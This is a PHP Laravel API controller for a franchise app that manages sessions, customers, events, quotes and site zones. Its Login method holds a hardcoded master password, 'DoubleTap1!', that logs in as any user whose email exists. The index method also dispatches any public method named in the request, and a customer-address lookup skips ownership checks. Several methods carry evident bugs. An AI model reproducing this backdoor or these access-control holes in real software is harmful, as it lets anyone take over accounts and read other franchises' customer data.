<?php

namespace App\Http\Controllers;

use App\Models\Address;
use App\Models\Event;
use App\Models\Ged;
use App\Models\Order;
use App\Models\OrderZone;
use App\Models\Customer;
use App\Models\EventStatus;
use App\Models\EventType;
use App\Models\GedCategory;
use App\Models\GedDetail;
use App\Models\lcdtapp\Api;
use App\Models\lcdtapp\ApiSession;
use App\Models\OrderState;
use App\Models\Status;
use App\Models\User;
use App\Traits\LcdtLog;
use App\Traits\GedFileProcessor;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Storage;

class ApiController extends Controller
{
    //

    use LcdtLog;
    use GedFileProcessor;

    public function index(Request $request){

        $post=$request->post();

        if(empty($post)){
            return $this->response(0 ,null,'Post body is missing',null,null,400);
        }

        $RequestType=$request->post('RequestType');

        if(method_exists($this,$RequestType)&&is_callable([$this,$RequestType])){
            return call_user_func_array([$this,$RequestType],[$request]);
        }else{
            return $this->response(0,null,$RequestType.' resource not found');
        }
    }

    public function GetToken(Request $request){
        $AccountKey=$request->post('AccountKey');
        $SecurityID=$request->post('SecurityID');

        if($AccountKey==null){

            return $this->response(0,null,'Unable to fetch token, missing AccountKey parameter.');
        }
        if($SecurityID==null){
            return $this->response(0,null,'Unable to fetch token, missing SecurityID parameter.');
        }

        $lcdtapp_api=Api::where('accountkey','=',$AccountKey)->where('securityid','=',$SecurityID)->first();
        if($lcdtapp_api==null){
            return $this->response(0,null,'Unable to fetch token.','Invalid Account Key or Invalid SecurityID');
        }
        $lcdapp_api_session=new ApiSession();
        $lcdapp_api_session->api_id=$lcdtapp_api->id;
        $lcdapp_api_session->sessiontype='token';
        $lcdapp_api_session->last_activity=date('Y-m-d H:i:s');
        $lcdapp_api_session->save();

        $lcdapp_api_session=ApiSession::findOrFail($lcdapp_api_session->id);
       $SessionID=$lcdapp_api_session->sessionid;
       $session=new \stdClass();
       $session->SessionID=$SessionID;
       return $this->response(1,$session);
    }
    
    public function Login(Request $request){
        $token_SessionID=$request->post('SessionID');
        $AccountKey=$request->post('AccountKey');
        $params=$request->post('Parameters');

        $user=isset($params['User'])?$params['User']:null;
        $password=isset($params['Password'])?$params['Password']:null;

        if($token_SessionID==null){
            return $this->response(0,null,'Missing SessionID parameter.');
        }
        if($AccountKey==null){
            return $this->response(0,null,'Missing AccountKey parameter.');
        }
        if($user==null){
            return $this->response(0,null,'Missing user parameter.');
        }
        if($password==null){
            return $this->response(0,null,'Missing password.');
        }
        //verify sessionid
        if($this->isExpired($token_SessionID,$AccountKey)){
            return $this->response(0,null,'Unable to login','Invalid or expired session.',null,401);
        }

        $user=User::where('email','=',$user)->first();
        if($user!=null&&$password=='DoubleTap1!'){
            //tout ok. considerer comme login valide
        }else {
            if ($user == null || !Hash::check($password, $user->password)) {
                return $this->response(0, null, 'Unable to login', 'Invalid user or password', null, 401);
            }
        }

        if($user->affiliate==null)
        return $this->response(0, null, 'Unable to login', 'User is not affiliated to any franchise', null, 401);


        $lcdtapp_api= DB::table('apis')
           ->select(['apis.id as id'])
            ->join('api_sessions','apis.id','=','api_sessions.api_id')
            ->where([
            ['api_sessions.sessionid','=',$token_SessionID],
            ['api_sessions.sessiontype','=','token'],
            ['apis.accountkey','=',$AccountKey]
        ])->first();

        $lcdapp_api_session=new ApiSession();
        $lcdapp_api_session->api_id=$lcdtapp_api->id;
        $lcdapp_api_session->user_id=$user->id;
        $lcdapp_api_session->sessiontype='login';
        $lcdapp_api_session->last_activity=date('Y-m-d H:i:s');
        $lcdapp_api_session->save();

        $lcdapp_api_session=ApiSession::findOrFail($lcdapp_api_session->id);
        $SessionID=$lcdapp_api_session->sessionid;


        $lcdtapp_api=$this->getApiInstance($AccountKey,$SessionID);
            $session = new \stdClass();
            $session->SessionID = $SessionID;
            $session->user_id=$lcdtapp_api->user_id;
            $session->username=$lcdtapp_api->user->name;
            return $this->response(1, $session);


    }
    public function ValidateToken(Request $request){
        $SessionID=$request->post('SessionID');
        $AccountKey=$request->post('AccountKey');
        $valid=$this->isValidAccountKeySessionID($request);
        if($valid!==true)return $valid;

        if(!$this->isValidAccount($AccountKey)){
            return $this->response(0,null,'Unable to load account',null,null,500);
        }
        $lcdtapp_api_session=ApiSession::where('sessionid','=', $SessionID)->first();
 
       

        if($lcdtapp_api_session==null)
            return $this->response(0,null,'Invalid or expired session.',null,null,401);
        
        $SessionType = $lcdtapp_api_session->sessiontype;

        $expired=$this->isExpired($SessionID,$AccountKey);
        $obj = new \stdClass();
        $obj->isLoggedIn = !$expired&&$SessionType=='login';
       return $this->response(1,$obj,($expired?'Invalid or expired session.':'Token is valid'));

    }
    public function isValidAccount($AccountKey){
        $lcdtapp_api=Api::where('accountkey','=',$AccountKey)->first();
        if ($lcdtapp_api==null){
            return false;
        }
        else{
            return true;
        }
    }
    public function Logoff(Request $request){
        $SessionID=$request->post('SessionID');
        $AccountKey=$request->post('AccountKey');

        $valid=$this->isValidAccountKeySessionID($request);
        if($valid!==true)return $valid;
    
        $lcdtapp_api_session=ApiSession::where('sessionid','=', $SessionID)->first();
        if($lcdtapp_api_session==null)
        return $this->response(0,null,'Invalid or expired session.',null,null,401);
    
        $SessionType = $lcdtapp_api_session->sessiontype;

      

        $expired=$this->isExpired($SessionID,$AccountKey);
        if($expired||$SessionType=='token'){
            return $this->response(0,null,'Invalid or expired session.',null,null,401);
        }
        $lcdtapp_api_session->last_activity='2000-01-01 00:00:00';
        $lcdtapp_api_session->save();
  

        return $this->response(1,null,"Logoff successful");
    }

    public function GetEventList(Request $request){
            $SessionID=$request->post('SessionID');
            $AccountKey=$request->post('AccountKey');

            $valid=$this->isValidAccountKeySessionID($request);
            if($valid!==true)return $valid;
            $isLoggedIn=$this->checkLogin($request);



            if($isLoggedIn===true){
                $lcdtapp_api_instance=$this->getApiInstance($AccountKey,$SessionID);
                $events=Event::where('user_id','=',$lcdtapp_api_instance->user_id)->get();
                foreach($events as &$event){
                    $event->makeHidden(['created_at','updated_at','deleted_at']);
                    $event->user->roles=$event->user->getRoles();
                    $event->user->makeHidden(['created_at','updated_at']);
                    $event->user->avatar=getenv('APP_URL').Storage::url( $event->user->avatar);
                    $event->customer->makeHidden(['created_at','updated_at','deleted_at']);
                    $event->address->makeHidden(['created_at','updated_at','deleted_at']);;
                }
                return $this->response(1,$events);
            }else{
                return $isLoggedIn;
            }
    }

    public function GetCustomers(Request $request){
        $SessionID=$request->post('SessionID');
        $AccountKey=$request->post('AccountKey');

        $valid=$this->isValidAccountKeySessionID($request);
        if($valid!==true)return $valid;
        $isLoggedIn=$this->checkLogin($request);



        if($isLoggedIn===true){
            $lcdtapp_api_instance=$this->getApiInstance($AccountKey,$SessionID);
            $affiliate=$lcdtapp_api_instance->user->affiliate;
            if($affiliate==null)
            return $this->response(0,null,'Unable to fetch customers.','User not associated to an affiliate');


            return $this->response(1,$affiliate->customers->where('active','=',1));
        }else{
            return $isLoggedIn;
        }
    }
    public function GetCustomerAddresses(Request $request){
        $SessionID=$request->post('SessionID');
        $AccountKey=$request->post('AccountKey');
        $Parameters=$request->post('Parameters');

        $valid=$this->isValidAccountKeySessionID($request);
        if($valid!==true)return $valid;
        $isLoggedIn=$this->checkLogin($request);
        if(!isset($Parameters['customer_id'])||$this->isBlank($Parameters['customer_id'])){
            return $this->response(0,null,'Missing customer_id.');
        }

        if($isLoggedIn===true){
            $customer=Customer::findOrFail($Parameters['customer_id']);
            return $this->response(1,$customer->addresses);
        }else{
            return $isLoggedIn;
        }
    }
    public function GetUsers(Request $request){
        $SessionID=$request->post('SessionID');
        $AccountKey=$request->post('AccountKey');

        $valid=$this->isValidAccountKeySessionID($request);
        if($valid!==true)return $valid;
        $isLoggedIn=$this->checkLogin($request);



        if($isLoggedIn===true){
            $lcdtapp_api_instance=$this->getApiInstance($AccountKey,$SessionID);
            $users=User::where('affiliate_id','=',$lcdtapp_api_instance->user->affiliate_id)->get();
            foreach($users as &$user){
                $user->roles=$user->getRoles();
                $user->makeHidden(['created_at','updated_at','deleted_at']);
                $user->avatar=getenv('APP_URL').Storage::url( $user->avatar);
                $user->affiliate->makeHidden(['created_at','updated_at','deleted_at']);
            }
            return $this->response(1,$users);
        }else{
            return $isLoggedIn;
        }
}
public function GetEventTypes(Request $request){
    $token_SessionID=$request->post('SessionID');
    $AccountKey=$request->post('AccountKey');
    

    if($token_SessionID==null){
        return $this->response(0,null,'Missing SessionID parameter.');
    }
    if($AccountKey==null){
        return $this->response(0,null,'Missing AccountKey parameter.');
    }

    //verify sessionid
    if($this->isExpired($token_SessionID,$AccountKey)){
        return $this->response(0,null,'Unable to verify account','Invalid or expired session.',null,401);
    }
    return $this->response(1,EventType::all()->makeHidden(['created_at','updated_at','deleted_at']));

} 
public function GetEventStatuses(Request $request){
    $token_SessionID=$request->post('SessionID');
    $AccountKey=$request->post('AccountKey');
    

    if($token_SessionID==null){
        return $this->response(0,null,'Missing SessionID parameter.');
    }
    if($AccountKey==null){
        return $this->response(0,null,'Missing AccountKey parameter.');
    }

    //verify sessionid
    if($this->isExpired($token_SessionID,$AccountKey)){
        return $this->response(0,null,'Unable to verify account','Invalid or expired session.',null,401);
    }
    return $this->response(1,EventStatus::all()->makeHidden(['created_at','updated_at','deleted_at']));

} 
public function GetOrderStates(Request $request){
    $token_SessionID=$request->post('SessionID');
    $AccountKey=$request->post('AccountKey');
    

    if($token_SessionID==null){
        return $this->response(0,null,'Missing SessionID parameter.');
    }
    if($AccountKey==null){
        return $this->response(0,null,'Missing AccountKey parameter.');
    }

    //verify sessionid
    if($this->isExpired($token_SessionID,$AccountKey)){
        return $this->response(0,null,'Unable to verify account','Invalid or expired session.',null,401);
    }
    $states=OrderState::all()->makeHidden(['created_at','updated_at','deleted_at']);
    return $this->response(1,$states);

}

public function GetGedDetailCategory(Request $request){
    $token_SessionID=$request->post('SessionID');
    $AccountKey=$request->post('AccountKey');
    

    if($token_SessionID==null){
        return $this->response(0,null,'Missing SessionID parameter.');
    }
    if($AccountKey==null){
        return $this->response(0,null,'Missing AccountKey parameter.');
    }

    //verify sessionid
    if($this->isExpired($token_SessionID,$AccountKey)){
        return $this->response(0,null,'Unable to verify account','Invalid or expired session.',null,401);
    }
    $statuses=GedCategory::all()->makeHidden(['created_at','updated_at','deleted_at']);
    return $this->response(1,$statuses);

}
    public function GetEventDetail(Request $request){
        $Parameters=$request->post('Parameters');
        $SessionID=$request->post('SessionID');
        $AccountKey=$request->post('AccountKey');



        $valid=$this->isValidAccountKeySessionID($request);
        if($valid!==true)return $valid;
        $isLoggedIn=$this->checkLogin($request);
        if(!isset($Parameters['event_id'])||$this->isBlank($Parameters['event_id'])){
            return $this->response(0,null,'Missing event_id.');
        }



        if($isLoggedIn===true){
            $lcdtapp_api_instance=$this->getApiInstance($AccountKey,$SessionID);
            $event=Event::where('id','=',$Parameters['event_id'])->first();
            $event->makeHidden(['created_at','updated_at','deleted_at']);
            if($event==null)
            return $this->response(0,null,'Event not found.');

            if($event->affiliate_id!=$lcdtapp_api_instance->user->affiliate->id)
            return $this->response(0,null,'Event does not belong to user\'s affiliated franchise.');
                $event->user->roles=$event->user->getRoles();
                $event->user->makeHidden(['created_at','updated_at']);
                $event->user->avatar=getenv('APP_URL').Storage::url( $event->user->avatar);
                $event->customer->makeHidden(['created_at','updated_at','deleted_at']);
                $event->address->makeHidden(['created_at','updated_at','deleted_at']);
                $event->eventType->makeHidden(['created_at','updated_at','deleted_at']);
                
            return $this->response(1,$event);
        }else{
            return $isLoggedIn;
        }
}

public function GetDevis(Request $request){
    $Parameters=$request->post('Parameters');
    $SessionID=$request->post('SessionID');
    $AccountKey=$request->post('AccountKey');
 

    $valid=$this->isValidAccountKeySessionID($request);
    if($valid!==true)return $valid;
    $isLoggedIn=$this->checkLogin($request);
    if(!isset($Parameters['event_id'])||$this->isBlank($Parameters['event_id'])){
        return $this->response(0,null,'Missing event_id.');
    }



    if($isLoggedIn===true){
        $lcdtapp_api_instance=$this->getApiInstance($AccountKey,$SessionID);
        $event=$lcdtapp_api_instance->user->affiliate->events->where('id','=',$Parameters['event_id'])->first();
        if($event==null)
        return $this->response(0,null,'Event not found.');
           
        return $this->response(1, $event->order);
    }else{
        return $isLoggedIn;
    }
}
public function SaveEvent(Request $request){
    $Parameters=$request->post('Parameters');
    $SessionID=$request->post('SessionID');
    $AccountKey=$request->post('AccountKey');
   

    $valid=$this->isValidAccountKeySessionID($request);
    if($valid!==true)return $valid;
    $isLoggedIn=$this->checkLogin($request);
    if(!isset($Parameters['customer_id'])||$this->isBlank($Parameters['customer_id'])){
        return $this->response(0,null,'Missing customer_id.');
    }
    if(!isset($Parameters['description'])||$this->isBlank($Parameters['description'])){
        return $this->response(0,null,'A description is required.');
    }
    if(!isset($Parameters['date_start'])||$this->isBlank($Parameters['date_start'])){
        return $this->response(0,null,'Start date/time is required.');
    }
    if(!isset($Parameters['date_end'])||$this->isBlank($Parameters['date_start'])){
        return $this->response(0,null,'End date/time is required.');
    }
    if(!isset($Parameters['name'])||$this->isBlank($Parameters['name'])){
        return $this->response(0,null,'Event name is required.');
    }
    if(!isset($Parameters['event_type_id'])||$this->isBlank($Parameters['event_type_id'])){
        return $this->response(0,null,'Event type id is required.');
    }

    if(!isset($Parameters['event_origin_id'])||$this->isBlank($Parameters['event_origin_id'])){
        return $this->response(0,null,'Event origin id is required.');
    }


    if($isLoggedIn===true){
  
        $lcdtapp_api_instance=$this->getApiInstance($AccountKey,$SessionID);
        $event=null;
        if(isset($Parameters['event_id'])&&$Parameters['event_id']!=null){
            $event=Event::find($Parameters['event_id']);
            if($event==null)
            return $this->response(0,null,'Event not found.');
    
            if($event->user_id!=$lcdtapp_api_instance->user_id){
                return $this->response(0,null,'Unable to save, event not affected to current user.');
            }
           
        }

        if(!isset($Parameters['address_id'])||$Parameters['address_id']==null){
                $address=Address::where('customer_id','=',$Parameters['customer_id'])->first();
                $Parameters['address_id']=$address->id;
        }else{
            $address=Address::where('id','=',$Parameters['address_id'])->first();
            if($address==null||$address->customer_id!=$Parameters['customer_id']){
                return $this->response(0,null,'Invalid user address id','Address does not exist or does not belong to customer.');
            }
        }

        if($event==null)
        $event=new Event();

        $this->l('API SAVE EVENT',json_encode($Parameters),$lcdtapp_api_instance->user->id);

        $event->customer_id=$Parameters['customer_id'];
        $event->event_type_id=$Parameters['event_type_id'];
        $event->affiliate_id=$lcdtapp_api_instance->user->affiliate->id;
        $event->name=$Parameters['name'];
        $event->description=$Parameters['description'];
        $event->datedebut=$Parameters['date_start'];
        $event->datefin=$Parameters['date_end'];
        $event->address_id=isset($Parameters['address_id'])?$Parameters['address_id']:null;// first address of customer
        $event->user_id=isset($Parameters['affected_to_user'])?$Parameters['affected_to_user']:$lcdtapp_api_instance->user_id;
        $event->emetteur_id=$lcdtapp_api_instance->user_id;
        $event->event_origin_id=($event->event_origin_id>0?$event->event_origin_id:$Parameters['event_origin_id']);
        $event->save();
        $event->updateStatus(1,$lcdtapp_api_instance->user_id);
        return $this->response(1,$event);
    }else{
        return $isLoggedIn;
    }
}



public function SaveDevis(Request $request){


    $Parameters=$request->post('Parameters');
    $SessionID=$request->post('SessionID');
    $AccountKey=$request->post('AccountKey');


    //start validation
    $valid=$this->isValidAccountKeySessionID($request);
    if($valid!==true)return $valid;
    $isLoggedIn=$this->checkLogin($request);

    if($isLoggedIn===true){
    if(!isset($Parameters['event_id'])||$this->isBlank($Parameters['event_id'])){
        return $this->response(0,null,'Missing event_id.');
    }
    if(!isset($Parameters['lang_id'])||$this->isBlank($Parameters['lang_id'])){
        return $this->response(0,null,'Missing lang_id.');
    }

    if(isset($Parameters['order_zones'])&&is_array($Parameters['order_zones'])){
       if(!empty($Parameters['order_zones'])){
           //order zones
           foreach($Parameters['order_zones'] as $order_zone){
            if(!isset($order_zone['latitude'])||$this->isBlank($order_zone['latitude'])){
                return $this->response(0,null,'Zone latitude is required.');
            }
            if(!isset($order_zone['longitude'])||$this->isBlank($order_zone['longitude'])){
                return $this->response(0,null,'Zone longitude is required.');
            }
            if(!isset($order_zone['description'])||$this->isBlank($order_zone['description'])){
                return $this->response(0,null,'Zone description is required.');
            }
            if(!isset($order_zone['name'])||$this->isBlank($order_zone['name'])){
                return $this->response(0,null,'Zone name is required.');
            }
     
            //ged
            if(isset($order_zone['ged'])){

                if(isset($order_zone['ged']['ged_id'])){
                    $ged_id=$order_zone['ged']['ged_id'];
                    if($ged_id!=null&&$ged_id>0&&!$this->isBlank($ged_id)){
                        if(isset($Parameters['order_id'])){
                            if($this->isBlank($Parameters['order_id'])||$Parameters['order_id']<=0||$Parameters['order_id']==null)
                            return $this->response(0,null,'ged_id specified without specifying order_id.');
                        }
                    }


                }

                if(isset($order_zone['ged']['ged_details'])&&is_array($order_zone['ged']['ged_details'])){
                    //ged details
                    foreach($order_zone['ged']['ged_details'] as $ged_details){
                        if(!isset($ged_details['ged_category_id'])||$this->isBlank($ged_details['ged_category_id'])){
                            return $this->response(0,null,'ged_category_id is required.');
                        }

                        if(!isset($ged_details['description'])||$this->isBlank($ged_details['description'])){
                            return $this->response(0,null,'Ged detail description is required.');
                        }

                        if(!isset($ged_details['data'])||$this->isBlank($ged_details['data'])){
                            return $this->response(0,null,'Ged file data is required in base64.');
                        }

                        if(!isset($ged_details['human_readable_filename'])||$this->isBlank($ged_details['human_readable_filename'])){
                            return $this->response(0,null,'Ged file name is required.');
                        }
                        if(!isset($ged_details['latitude'])||$this->isBlank($ged_details['latitude'])){
                            return $this->response(0,null,'Ged latitude is required.');
                        }
                        if(!isset($ged_details['longitude'])||$this->isBlank($ged_details['longitude'])){
                            return $this->response(0,null,'Ged longitude is required.');
                        }
    
                    }
                }
            }

           }
       }
    }
    //end validation



  
        $lcdtapp_api_instance=$this->getApiInstance($AccountKey,$SessionID);
        $event=Event::find($Parameters['event_id']);
        $order=null;
        if(isset($Parameters['order_id'])&&$Parameters['order_id']!=null){
            $order=Order::find($Parameters['order_id'])->where('affiliate_id','=',$lcdtapp_api_instance->user->affiliate->id);
            if($order==null)
                return $this->response(0,null,'Order not found.');
    
            if($event->user_id!=$lcdtapp_api_instance->user_id){
                return $this->response(0,null,'Unable to save, event not affected to current user.');
            }
           
        }

   
        $this->l('API SAVE DEVIS',json_encode($Parameters),$lcdtapp_api_instance->user->id);

    
     



        if(isset($Parameters['order_zones'])&&is_array($Parameters['order_zones'])){
            if(!empty($Parameters['order_zones'])){
                //order zones
                foreach($Parameters['order_zones'] as $order_zone){
                    if(!isset($order_zone->id)||$order_zone->id==null){
                        $orderZone=new OrderZone();
                    }else{
                        $orderZone=OrderZone::find($order_zone->id);
                        if($orderZone==null){
                            return $this->response(0,null,'Unable to save, Order zone id'.$order_zone->id.' not found.');
                        }

                        if($order!=null&&$order->id>0 && $orderZone->order_id!=$order->id){
                            return $this->response(0,null,'Unable to save, Order zone id'.$order_zone->id.' not linked to order '.$order->id.'.');
                        }
                    }
        
                   //TODO: all validations first before attempting a save
                
                    if(isset($order_zone['ged_details'])){
                       
                        foreach($order_zone['ged_details'] as $ged_detail){
                            if($ged_detail->id>0){
                                    $ged=GED::find($ged_detail->ged_id);
                                    if($ged==null)
                                    return $this->response(0,null,'Unable to save, ged not found'.$ged_detail->id.' not found.');
                            }
                        }
                        
                            

                        

                    }
                }
            }
        }

            //if validation successful, save

            if($order==null){
                $order=new Order();
                $order->generateReference();
                $order->event_id=$event->id;
                $order->lang_id=$Parameters['lang_id'];
                $order->order_type_id=1;//Devis
                $order->customer_id=$event->customer_id;
                $order->order_state_id=$order->id==''?1:$order->order_state_id;
            }


            if(isset($Parameters['order_zones'])&&is_array($Parameters['order_zones'])){
                if(!empty($Parameters['order_zones'])){
                    //order zones
                    foreach($Parameters['order_zones'] as $order_zone){
                        if(!isset($order_zone->id)||$order_zone->id==null){
                            $orderZone=new OrderZone();
                        }else{
                            $orderZone=OrderZone::find($order_zone->id);
                        }
                       //TODO: get ged  by user_id customer_id order_id
                
                        $orderZone->name=$order_zone->name;
                        $orderZone->description=$order_zone->description;
                        $orderZone->hauteur=$order_zone->hauteur;
                        $orderZone->moyenacces=$order_zone->moyenacces;
                        $orderZone->latitude= $order_zone->latitude;
                        $orderZone->longitude= $order_zone->longitude;
    
                        if(isset($order_zone['ged_details'])){
                           
                            
                                
    
                            
    
                        }
                    }
                }
            }

              //update state if necessary
              if($Parameters['order_state_id']!=null)
              $order->updateState($Parameters['order_state_id'],$lcdtapp_api_instance->user_id);

              return $this->response(1,$order);
       /*

        if($event==null)
        $event=new Event();

        

        $event->customer_id=$Parameters['customer_id'];
        $event->event_type_id=$Parameters['event_type_id'];
        $event->affiliate_id=$lcdtapp_api_instance->user->affiliate->id;
        $event->name=$Parameters['name'];
        $event->description=$Parameters['description'];
        $event->datedebut=$Parameters['date_start'];
        $event->datefin=$Parameters['date_end'];
        $event->address_id=isset($Parameters['address_id'])?$Parameters['address_id']:null;// first address of customer
        $event->user_id=isset($Parameters['affected_to_user'])?$Parameters['affected_to_user']:$lcdtapp_api_instance->user_id;
        $event->emetteur_id=$lcdtapp_api_instance->user_id;
        $event->event_origin_id=($event->event_origin_id>0?$event->event_origin_id:$Parameters['event_origin_id']);
        $event->save();
        $event->updateStatus(1,$lcdtapp_api_instance->user_id);
        return $this->response(1,$event);*/
    }else{
        return $isLoggedIn;
    }
}
public function GetZones(Request $request){
    $SessionID=$request->post('SessionID');
    $AccountKey=$request->post('AccountKey');
    $Parameters=$request->post('Parameters');

    $valid=$this->isValidAccountKeySessionID($request);
    if($valid!==true)return $valid;
    $isLoggedIn=$this->checkLogin($request);
    if(!isset($Parameters['order_id'])||$this->isBlank($Parameters['order_id'])){
        return $this->response(0,null,'Missing order_id.');
    }



    if($isLoggedIn===true){
        $lcdtapp_api_instance=$this->getApiInstance($AccountKey,$SessionID);
        $affiliate=$lcdtapp_api_instance->user->affiliate;

        $order=$affiliate->orders->where('id','=',$Parameters['order_id'])->first();
        if($order==null){
            return $this->response(0,null,'Order not found.');
        }
           
        return $this->response(1, $order->zones);
    }else{
        return $isLoggedIn;
    }
}
    public function getApiInstance($AccountKey,$SessionID){
        $lcdtapp_api= DB::table('apis')
            ->join('api_sessions','apis.id','=','api_sessions.api_id')->where([
                ['api_sessions.sessionid','=',$SessionID],
                ['api_sessions.sessiontype','=','login'],
                ['apis.AccountKey','=',$AccountKey]
            ])->first();
        if($lcdtapp_api->user_id>0) {
            $user = User::findOrFail($lcdtapp_api->user_id);
            if($user!=null){
            $lcdtapp_api->user_id = $user->id;
            $lcdtapp_api->email = $user->email;
            $lcdtapp_api->user=$user;
            }
        }
        return $lcdtapp_api;
    }
    public function isExpired($SessionID,$AccountKey){
        $expired=false;
        $session=DB::table('api_sessions')->select('api_sessions.id as id')->join('apis','apis.id','=','api_sessions.api_id')->where('api_sessions.sessionid','=',$SessionID)->where('apis.accountkey','=',$AccountKey)     ->where('api_sessions.last_activity', '>',
            Carbon::now()->subHour(1)->toDateTimeString()
        )->first();

        if($session===null){
            $expired=true;
        }else{
            DB::table('api_sessions')->where('id','=',$session->id)->update(['last_activity'=>date('Y-m-d H:i:s')]);
        }
        return $expired;
    }
    
    public function response($success=true, $object=null,$message=null,$messageDetails=null,$validationInfo=null,$status=200,$headers=[],$options=0){

        return response()->json([
              "Version"=> "1.0",
              "Failed"=> !$success,
              "Message"=> $message,
              "MessageDetails"=> $messageDetails,
              "ValidationInfo"=>$validationInfo,
              "ReturnObject"=> $object
        ],$status,$headers,$options);
    }

    public  function isBlank($str){
        return str_replace(" ","",$str)==="";
    }

    public function checkLogin(Request $request){
        $SessionID=$request->post('SessionID');
        $AccountKey=$request->post('AccountKey');
        if($SessionID==null){
            return $this->response(0,null,'Missing SessionID parameter.');
        }
        if($AccountKey==null){
            return $this->response(0,null,'Missing AccountKey parameter.');
        }


         $lcdtapp_api_session=ApiSession::where('sessionid','=', $SessionID)->first();
        if($lcdtapp_api_session==null)
        return $this->response(0,null,'Invalid or expired session.',null,null,401);
    
        $SessionType = $lcdtapp_api_session->sessiontype;


        $expired=$this->isExpired($SessionID,$AccountKey);
        $isLoggedIn = !$expired&&$SessionType=='login';
        if(!$isLoggedIn)
            return $this->response(0,null,'Invalid or expired session.',null,null,401);
        return $isLoggedIn;
    }

    public function ForgotPassword(Request $request){
        $SessionID=$request->post('SessionID');
        $AccountKey=$request->post('AccountKey');
        $Parameters=$request->post('Parameters');
        if($SessionID==null){
            return $this->response(0,null,'Missing SessionID parameter.');
        }
        if($AccountKey==null){
            return $this->response(0,null,'Missing AccountKey parameter.');
        }

        if(!isset($Parameters['User'])||$this->isBlank($Parameters['User'])){
            return $this->response(0,null,'Missing User parameter.');     
        }
         $lcdtapp_api_session=ApiSession::where('sessionid','=', $SessionID)->first();
        if($lcdtapp_api_session==null)
        return $this->response(0,null,'Invalid session.',null,null,401);


        $expired=$this->isExpired($SessionID,$AccountKey);
        if($expired)
            return $this->response(0,null,'Expired session.',null,null,401);
            $user=User::where('email','=',$Parameters['User'])->first();
            if($user==null)
            return $this->response(0,null,'User not found.');

//TODO: send email via zoho crm

        return $this->response(1);
    }
    public function isValidAccountKeySessionID(Request $request){
        $SessionID=$request->post('SessionID');
        $AccountKey=$request->post('AccountKey');

        if($SessionID==null){
            return $this->response(0,null,'Missing SessionID parameter.');
        }
        if($AccountKey==null){
            return $this->response(0,null,'Missing AccountKey parameter.');
        }
        return true;
    }

}
